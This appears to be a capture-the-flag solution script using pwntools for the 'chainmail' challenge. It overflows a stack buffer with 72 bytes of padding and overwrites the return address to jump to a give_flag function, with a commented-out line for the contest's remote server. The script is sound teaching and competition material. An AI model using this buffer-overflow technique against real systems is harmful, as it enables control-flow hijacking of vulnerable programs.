from pwn import *

#Pwning the binary
target = process('./chal')
pid = gdb.attach(target, 'b *main+179\ncontinue')
#Pwning the actual netcat connection
#target = remote('chainmail.chal.uiuc.tf', 1337)

print(target.recvuntil(b'recipient'))
padding = b'a' *72
elf = ELF('chal')

payload = padding + p64(elf.symbols['main']+179) + p64(elf.symbols['give_flag'])

target.sendline(payload)

target.interactive()